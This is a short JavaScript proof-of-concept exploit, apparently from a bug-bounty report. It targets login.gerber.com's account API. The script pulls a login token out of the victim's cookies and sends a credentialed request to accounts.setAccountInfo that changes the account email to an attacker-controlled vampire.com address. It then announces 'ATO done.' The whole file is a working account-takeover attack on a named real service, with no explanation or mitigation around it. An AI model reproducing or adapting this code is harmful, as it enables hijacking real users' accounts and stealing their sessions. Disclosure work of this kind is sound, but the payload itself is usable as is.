var xhr=new XMLHttpRequest();
xhr.withCredentials=true;
xhr.open("POST","https://login.gerber.com/accounts.setAccountInfo");
var login_token=document.cookie.match(/glt_3_sEe2TViTwxwxZXGi1Uj-ivv0xK3ILpkuyQLo-0Mu-fbPE7YL96hYRZInMkbTodjo=(.*\.sc3)/)[1]
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
xhr.onreadystatechange=()=>{
if(xhr.readyState==4){
alert("ATO done.")
}
    
}
xhr.send(`profile=%7B%22email%22%3A%22vampire01%2b${Math.floor((Math.random() * 10000) + 1)}@vampire.com%22%7D&APIKey=3_sEe2TViTwxwxZXGi1Uj-ivv0xK3ILpkuyQLo-0Mu-fbPE7YL96hYRZInMkbTodjo&login_token=${login_token}`)
